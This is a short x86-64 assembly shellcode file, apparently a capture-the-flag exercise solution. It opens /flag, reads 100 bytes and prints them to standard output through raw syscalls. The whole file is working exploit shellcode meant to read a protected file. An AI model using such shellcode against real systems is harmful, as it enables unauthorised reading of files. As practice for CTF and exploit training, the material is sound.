.intel_syntax noprefix
.global _start
_start:

// int fd = open("/flag", 0);
mov eax, 2
mov byte ptr [rsp], '/'
mov byte ptr [rsp+1], 'f'
mov byte ptr [rsp+2], 'l'
mov byte ptr [rsp+3], 'a'
mov byte ptr [rsp+4], 'g'
mov byte ptr [rsp+5], 0
push rsp
pop rdi
mov esi, 0
syscall

// read(fd, buff, 100);
mov edi, eax
mov eax, 0 
push rsp
pop rsi
mov edx, 100
syscall

// write(1, buff, 100);
mov eax, 1
mov edi, 1
push rsp
pop rsi
mov edx, 100
syscall

flag_path:
.string "/flag"